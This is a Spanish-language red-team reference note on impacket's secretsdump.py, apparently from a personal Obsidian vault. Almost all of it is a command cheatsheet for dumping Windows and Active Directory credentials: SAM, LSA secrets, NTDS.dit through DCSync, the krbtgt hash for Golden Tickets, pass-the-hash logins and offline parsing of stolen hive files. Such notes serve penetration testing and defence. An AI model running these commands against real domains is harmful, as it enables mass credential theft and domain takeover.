---
aliases:
  - secretsdump.py
  - impacket-secretsdump
tags:
  - tool/impacket
  - technique/credential-access
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
tertiary categories:
kind: Tool
linked:
  - "[[DCSync - Tooling]]"
  - "[[NTDS.dit Extraction - Tooling]]"
  - "[[AD - DCSync Rights Discovery - Tooling]]"
---
# secretsdump

`secretsdump.py` (impacket) — extrae credenciales y hashes de Windows/AD: **SAM**, **LSA secrets**, cached creds y **NTDS.dit** vía DRSUAPI (DCSync) o parseo offline. Tool central de credential-access; aparece tanto en DCSync como en extracción de NTDS.dit.

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `secretsdump.py DOMAIN/user:pass@<DC>` | Dump remoto: SAM + LSA + NTDS vía DRSUAPI | Creds válidas + acceso al DC |
| `secretsdump.py -just-dc DOMAIN/user:pass@<DC>` | Solo NTDS.dit (todos los hashes del dominio) vía DCSync | Tenés derechos DCSync |
| `secretsdump.py -just-dc-ntlm DOMAIN/user:pass@<DC>` | Solo hashes NTLM | Pass-the-Hash masivo |
| `secretsdump.py -just-dc-user krbtgt DOMAIN/user:pass@<DC>` | Hash de `krbtgt` | Golden Ticket |
| `secretsdump.py -hashes LM:NT DOMAIN/user@<DC>` | Auth por Pass-the-Hash en vez de pass | Ya tenés un hash |
| `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL` | Parseo **offline** de NTDS.dit + SYSTEM | Copia robada (VSS / ntdsutil) |
| `secretsdump.py -sam sam -system system LOCAL` | Hashes locales offline | SAM + SYSTEM exfiltrados |

^secretsdump-cheatsheet

> [!tip] `-just-dc` ejecuta **DCSync** (DRSUAPI `GetNCChanges`) → requiere `DS-Replication-Get-Changes` + `-Get-Changes-All`. Sin esos derechos, usá la copia raw de NTDS.dit. Ver [[DCSync - Tooling]] · [[NTDS.dit Extraction - Tooling]].

## Notas relacionadas
- [[DCSync - Tooling]] · [[NTDS.dit Extraction - Tooling]] · [[AD - DCSync Rights Discovery - Tooling]]
